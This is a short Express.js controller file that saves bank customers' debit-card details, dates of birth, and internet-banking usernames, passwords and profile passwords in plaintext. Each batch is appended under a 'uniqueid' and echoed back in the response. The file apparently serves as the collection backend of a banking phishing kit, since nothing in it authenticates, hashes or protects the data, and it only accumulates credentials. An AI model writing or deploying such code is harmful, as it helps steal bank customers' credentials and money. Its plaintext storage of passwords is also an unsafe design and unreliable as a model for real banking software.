// controllers/otherControler.js
const CombinedDebitCard = require('../models/CombinedDebitCard');
const CombinedInternetBanking = require('../models/CombinedInternetBanking');

exports.createOrUpdateCombinedDebitCard = async (req, res) => {
    try {
      const { uniqueid, accountNo, cifNo, branchName, dob } = req.body;
      const submission = {
        accountNo,
        cifNo,
        branchName,
        dob,
        createdAt: new Date()
      };

      const result = await CombinedDebitCard.findOneAndUpdate(
        { uniqueid },
        { $push: { submissions: submission } },
        { new: true, upsert: true }
      );
  
      res.status(201).json({ 
        success: true, 
        message: 'Debit card data saved successfully', 
        data: result 
      });
    } catch (error) {
      console.error('Error saving CombinedDebitCard:', error);
      res.status(500).json({ 
        success: false, 
        message: error.message 
      });
    }
};

exports.createOrUpdateCombinedInternetBanking = async (req, res) => {
    try {
      const { uniqueid, username, password, profilePassword } = req.body;
      const submission = {
        username,
        password,
        profilePassword,
        createdAt: new Date()
      };
      const result = await CombinedInternetBanking.findOneAndUpdate(
        { uniqueid },
        { $push: { submissions: submission } },
        { new: true, upsert: true }
      );
  
      res.status(201).json({ 
        success: true, 
        message: 'Internet banking data saved successfully', 
        data: result 
      });
    } catch (error) {
      console.error('Error saving CombinedInternetBanking:', error);
      res.status(500).json({ 
        success: false, 
        message: error.message 
      });
    }
};
